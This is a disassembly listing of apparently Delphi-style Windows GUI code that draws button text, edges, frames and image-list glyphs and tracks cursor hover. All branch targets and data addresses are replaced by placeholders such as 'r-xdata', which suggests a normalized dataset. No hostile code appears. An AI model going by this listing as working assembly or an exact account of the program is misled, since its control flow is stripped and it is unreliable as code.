mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx [ ebp + 0xc ]
cmp [ edi + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
je r-xdata
mov edx ebx
mov eax edi
call sub_42d6a4
mov esi eax
call sub_4301bc
call sub_43029c
test al al
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
xor edx edx
mov dl [ edi + 0x20 ]
mov ecx edx
cdq
idiv ecx
add eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
dec bl
je r-xdata
push 0x1
push 0x1fffffff
push 0x1fffffff
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d780
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_44b570
push eax
call ImageList_DrawEx
jmp r-xdata
cmp bl 0x3
jne r-xdata
mov bl 0x5
jmp r-xdata
dec ebx
sub bl 0x2
jb r-xdata
push 0x0
push 0x1fffffff
mov eax 0xff00000f
call sub_41c268
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d780
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_44b570
push eax
call ImageList_DrawEx
call sub_4301bc
lea ecx [ ebp - 0x14 ]
mov edx ebx
call sub_430500
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi + 0x8 ]
call sub_44b570
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_41d780
push eax
call sub_4301bc
lea ecx [ ebp - 0x14 ]
pop edx
call sub_4303ec
jmp r-xdata
mov bl 0x4
jmp r-xdata
jmp r-xdata
mov bl 0x2
sub_42dde0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_41d030
cmp [ ebp + 0xc ] 0x1
jne r-xdata
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_4042a0
push eax
mov eax esi
call sub_4044a0
push eax
mov eax ebx
call sub_41d780
push eax
call DrawTextA
push 0x1
push 0x1
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000014
mov eax [ ebx + 0xc ]
call sub_41c728
mov eax edi
or eax 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_4042a0
push eax
mov eax esi
call sub_4044a0
push eax
mov eax ebx
call sub_41d780
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ ebx + 0xc ]
call sub_41c728
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_4042a0
push eax
mov eax esi
call sub_4044a0
push eax
mov eax ebx
call sub_41d780
push eax
call DrawTextA
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_42dec0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
and eax 0x2
cmp eax 0x2
jne r-xdata
mov edx [ ebx + 0xc ]
sub edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
sub eax [ ebx ]
lea ecx [ ebp - 0x18 ]
call sub_412618
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_412618
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
lea ecx [ ebp - 0x20 ]
pop edx
call sub_412618
jmp r-xdata
cmp [ ebp + 0x1c ] 0x1
jne r-xdata
mov [ ebp + 0x1c ] 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x40 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_412640
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea ecx [ ebp - 0x28 ]
xor edx edx
xor eax eax
call sub_412618
push 0x0
lea eax [ ebp - 0x40 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
xor edx edx
xor eax eax
call sub_412640
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x8 ]
or eax 0x400
push eax
push edi
mov eax [ ebp + 0x20 ]
call sub_4042a0
push eax
mov eax [ ebp + 0x20 ]
call sub_4044a0
push eax
mov eax [ ebp - 0x8 ]
call sub_41d780
push eax
call DrawTextA
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
sub eax [ edi ]
lea ecx [ ebp - 0x28 ]
call sub_412618
jmp r-xdata
mov eax [ ebp + 0x20 ]
call sub_4042a0
test eax eax
jle r-xdata
mov [ ebp + 0x1c ] 0x0
mov eax [ ebp - 0x18 ]
mov edx eax
sub edx [ ebp - 0x20 ]
inc edx
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
sub edx [ ebp - 0x1c ]
inc edx
sar edx 0x1
jns r-xdata
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov [ esi ] edx
sub eax [ ebp - 0x28 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ esi + 0x4 ] edx
sub eax [ ebp - 0x24 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ ebp - 0x10 ] eax
adc eax 0x0
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
xor eax eax
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x18 ] 0xffffffff
jne r-xdata
mov al [ ebp + 0x1c ]
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
pop ecx
sub eax ecx
lea ecx [ ebp - 0x30 ]
call sub_412618
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp + 0x14 ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
add eax [ ebp - 0x28 ]
call sub_412618
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
call sub_412618
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi ] eax
add eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x24 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x28 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
add [ esi ] eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
add [ esi + 0x4 ] eax
call sub_4301bc
call sub_43029c
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x20 ]
mov [ esi ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec al
je r-xdata
mov [ ebp + 0x14 ] eax
adc eax 0x0
mov [ ebp + 0x14 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
push eax
push edi
call OffsetRect
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
push eax
push edi
call OffsetRect
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi + 0x4 ] eax
add eax [ ebp - 0x1c ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp - 0x14 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x1c ]
mov [ esi + 0x4 ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_42e1ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x24 ]
mov eax [ ebp + 0x28 ]
push eax
push edi
mov al [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_42dec0
mov al [ ebp + 0x14 ]
push eax
mov al [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_42dc7c
mov eax [ ebp + 0x8 ]
push eax
mov al [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_42dde0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_42e25c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43ce90
mov eax esi
mov edx [ r-xdata ]
call sub_403440
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_42e280
push ebx
mov ebx eax
mov eax ebx
call sub_44a794
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x172 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x20 ]
cmp al [ edx + 0x170 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_42e2cc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x20 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov eax [ eax + 0x6c ]
cmp eax [ esi + 0x168 ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_42e2fc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x20 ]
call sub_42ebac
sub_42e31c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_42ec38
sub_42e33c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d4a0
mov [ ebx + 0x16c ] eax
mov eax [ ebx + 0x16c ]
mov [ eax + 0x2c ] ebx
mov [ eax + 0x28 ] sub_42eb6c
mov ecx esi
xor edx edx
mov eax ebx
call sub_445bb0
push 0x17
push 0x16
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_43e278
mov edx 0xff00000f
mov eax ebx
call sub_43e2ec
mov [ ebx + 0x174 ] 0x4
mov [ ebx + 0x17c ] 0xffffffff
mov [ ebx + 0x173 ] 0x0
mov [ ebx + 0x178 ] 0x1
inc [ rw-data ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_42e3fc
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
dec [ rw-data ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_445c0c
mov eax [ esi + 0x16c ]
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_42e434
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x3c ] edx
mov esi eax
xor eax eax
push ebp
push sub_42e85e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov [ esi + 0x182 ] 0x1
mov [ esi + 0x171 ] 0x0
jmp r-xdata
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x160 ]
call sub_41d67c
call sub_4301bc
call sub_43029c
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov eax [ esi + 0x4c ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov ecx [ esi + 0x48 ]
xor edx edx
xor eax eax
call sub_412640
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_41d780
mov edx eax
mov eax esi
call sub_43b2a0
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov [ esi + 0x182 ] 0x0
cmp [ esi + 0x168 ] 0x0
je r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov ebx 0x2010
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x5
jmp r-xdata
mov [ esi + 0x182 ] 0x3
jmp r-xdata
xor eax eax
mov al [ esi + 0x178 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xf
push eax
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
setb al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41d780
push eax
call DrawEdge
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
push ebx
push 0x4
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41d780
push eax
call DrawFrameControl
jmp r-xdata
or ebx 0x200
cmp [ esi + 0x181 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x4
jmp r-xdata
xor ebx ebx
cmp [ esi + 0x180 ] 0x0
je r-xdata
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x19 ]
push eax
call InflateRect
test [ esi + 0x1c ] 0x10
je r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x2
mov [ ebp - 0x9 ] 0x3
jmp r-xdata
lea edx [ ebp - 0x19 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
test bl bl
jne r-xdata
mov al [ ebp - 0x9 ]
sub al 0x2
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x182 ] 0x3
jne r-xdata
cmp [ esi + 0x178 ] 0x0
jne r-xdata
call sub_4301bc
lea ecx [ ebp - 0x28 ]
mov edx ebx
call sub_4305c0
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_41d780
push eax
call sub_4301bc
lea ecx [ ebp - 0x28 ]
pop edx
call sub_4303a8
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41d780
push eax
call sub_4301bc
lea ecx [ ebp - 0x28 ]
pop edx
call sub_43030c
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
call sub_4301bc
lea ecx [ ebp - 0x28 ]
mov dl [ ebp - 0x9 ]
call sub_430500
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_41d780
push eax
call sub_4301bc
lea ecx [ ebp - 0x28 ]
pop edx
call sub_4303a8
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41d780
push eax
call sub_4301bc
lea ecx [ ebp - 0x28 ]
pop edx
call sub_43030c
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
mov bl 0x2
dec al
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ esi + 0x70 ]
call sub_41cf14
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_41d2ec
lea ecx [ ebp - 0x8 ]
xor edx edx
xor eax eax
call sub_412618
test bl bl
je r-xdata
cmp [ ebp - 0x9 ] 0x4
jne r-xdata
mov bl 0x3
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x40 ]
mov eax esi
call sub_43e14c
mov eax [ ebp - 0x40 ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_440460
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_42e1ec
mov edx 0xff000014
mov eax 0xff00000f
call sub_423828
mov edx eax
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_41cee8
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_41d2ec
cmp [ esi + 0x181 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e865
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax 0x1
call sub_412618
jmp r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c728
mov bl 0x4
jmp r-xdata
dec al
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x3c ]
mov eax esi
call sub_43e14c
mov eax [ ebp - 0x3c ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_440460
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_42e1ec
jmp r-xdata
mov bl 0x5
jmp r-xdata
sub_42e86c
push ebx
push esi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_43c9f8
cmp esi eax
sete bl
xor bl 0x1
mov [ esi + 0x181 ] bl
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax esi
call sub_43f334
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax esi
call sub_43f334
jmp r-xdata
sub_42e8d0
push ebx
mov ebx eax
mov eax ebx
call sub_44023c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov edx eax
mov eax [ ebx + 0x16c ]
call sub_42d6a4
pop ebx
retn
sub_42e8fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_43f748
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
jne r-xdata
mov [ esi + 0x171 ] 0x1
mov [ esi + 0x182 ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42e954
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43fa00
cmp [ ebx + 0x171 ] 0x0
je r-xdata
cmp [ ebx + 0x181 ] 0x0
jne r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_42e86c
mov [ ebp - 0x2 ] 0x3
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
mov al [ ebp - 0x2 ]
cmp al [ ebx + 0x182 ]
je r-xdata
mov eax ebx
call sub_43db50
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
mov al [ ebp - 0x2 ]
mov [ ebx + 0x182 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
test edi edi
jl r-xdata
mov eax ebx
call sub_43db94
cmp edi eax
jg r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebp - 0x2 ] 0x2
mov [ ebp - 0x2 ] 0x3
jmp r-xdata
sub_42e9f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43faa8
cmp [ ebx + 0x171 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ ebx + 0x171 ] 0x0
test esi esi
jl r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_43db50
cmp esi eax
jge r-xdata
mov [ ebp - 0x3 ] al
cmp [ ebx + 0x168 ] 0x0
jne r-xdata
test edi edi
jl r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov [ ebx + 0x182 ] 0x0
mov [ ebx + 0x181 ] 0x0
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax ebx
call sub_43db94
cmp edi eax
jle r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov dl [ ebx + 0x170 ]
xor dl 0x1
mov eax ebx
call sub_42ebac
cmp [ ebx + 0x170 ] 0x0
je r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov al [ ebx + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebx + 0x182 ] 0x3
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
mov eax ebx
call sub_42e86c
mov eax ebx
mov si 0xffeb
call sub_40348c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
sub_42eb40
push esi
mov esi eax
test dl dl
jae r-xdata
cmp dl 0x4
jbe r-xdata
mov dl 0x1
jmp r-xdata
mov eax [ esi + 0x16c ]
cmp dl [ eax + 0x20 ]
je r-xdata
mov dl 0x4
pop esi
retn
call sub_42d67c
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42eb74
add esp 0xfffffff0
mov edx [ eax + 0x168 ]
test edx edx
je r-xdata
add esp 0x10
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov [ esp ] 0xb018
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] eax
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov eax [ eax + 0x30 ]
call sub_4416b8
sub_42ebac
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x168 ] 0x0
jne r-xdata
cmp bl [ esi + 0x170 ]
je r-xdata
xor ebx ebx
pop esi
pop ebx
retn
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov [ esi + 0x170 ] bl
test bl bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov [ esi + 0x182 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ esi + 0x182 ] 0x0
jne r-xdata
mov eax esi
call sub_42eb74
mov [ esi + 0x182 ] 0x3
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
test bl bl
je r-xdata
sub_42eca4
push esi
mov esi eax
cmp dl [ esi + 0x178 ]
je r-xdata
pop esi
retn
mov [ esi + 0x178 ] dl
test dl dl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42ed14
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x16c ]
call sub_42d6a4
mov eax ebx
call sub_42e86c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
sub_42ed48
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x4 ]
cmp eax [ ebx + 0x168 ]
jne r-xdata
pop esi
pop ebx
retn
